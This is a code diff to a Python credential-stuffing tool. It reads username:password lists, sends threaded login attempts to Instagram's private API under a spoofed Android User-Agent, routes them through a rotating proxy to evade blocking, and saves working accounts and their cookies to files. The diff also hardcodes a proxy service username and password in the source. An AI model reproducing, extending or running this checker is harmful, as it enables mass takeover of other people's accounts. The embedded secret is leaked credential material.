@@ -4,9 +4,8 @@ import threading
 import json
 from uuid import uuid4
 
-def login(username, password, proxy):
+def login(username: str, password: str, proxy: str):
 	uid = uuid4()
-	url = "https://i.instagram.com/api/v1/accounts/login/"
 	headers = { 'User-Agent': 'Instagram 113.0.0.39.122 Android (24/5.0; 515dpi; 1440x2416; huawei/google; Nexus 6P; angler; angler; en_US)',
 		"Accept": "/",
 		"Accept-Encoding": "gzip, deflate",
@@ -27,8 +26,21 @@ def login(username, password, proxy):
 		'login_attempt_countn': '0'
 	}
 
+	options = {
+		"code_challenge": "y_SfRG4BmOES02uqWeIkIgLQAlTBggyf_G7uKT51ku8"
+	}
+
+	urlparams = ""
+	for key, value in options.items():
+		urlparams += key + "=" + value + "&"
+
+	urlparams = urlparams[:-1]
+	url = "https://i.instagram.com/api/v1/accounts/login/" + "?" + urlparams
+
 	if proxy == "true":
-		proxy = { "http" : "http://" + functions.getproxy('files/proxies.txt'), "https": "http://" + functions.getproxy('files/proxies.txt')  }
+		_user_ = 'spwblik9ka'
+		_pass_ = '9Hub2Pbx69gXhkelhF'
+		proxy = f"https://{_user_}:{_pass_}@gate.smartproxy.com:10000"
 	else:
 		proxy = { "http" : ""  }
 
@@ -38,8 +50,12 @@ def login(username, password, proxy):
 			print("[>] Could not check %s due to failing 5 times" % (username))
 			functions.logtofile2("accounts_couldnotcheck.txt", username + ":" + password)
 		try:
-			response = requests.post(url=url, headers=headers, data=data, timeout=10, proxies=proxy)
-			print(response)
+			print(data)
+			response = requests.post(url=url, headers=headers, data=data, timeout=10, proxies={
+				'http': proxy,
+				'https': proxy
+			})
+			
 			if not response.text:
 				pass
 				attempts += 1
@@ -52,10 +68,11 @@ def login(username, password, proxy):
 	bad = False
 	loadjson = json.loads(response.text)
 
-	print(response.text)
+	print(loadjson)
 
 	try:
 		if username == loadjson["logged_in_user"]["username"]:
+			print("Here")
 			print(functions.CGREEN+"[>] Successfully logged in: " + username)
 			functions.logtofile("accounts/" + username + "", cookies)
 			functions.logtofile2("accounts_working.txt", username + ":" + password)
@@ -143,16 +160,10 @@ def login(username, password, proxy):
 		pass
 
 def logintotheaccounts():
-	question = input(functions.YELLOW + "[>] Would you like to use proxies from proxies.txt? (Y/N): ")
-	if question == "Y" or question == "y":
-		proxies = "true"
-	else:
-		proxies = "false"
-
 	with open('files/accounts.txt', 'r') as f:
 		for line in f:
 			username = line.split(':')[0]
 			password = line.split(':')[1]
-			th = threading.Thread(target=login, args=(username, password, proxies))
+			th = threading.Thread(target=login, args=(username, password, "true"))
 			th.start()
 			#login(username, password, proxies)
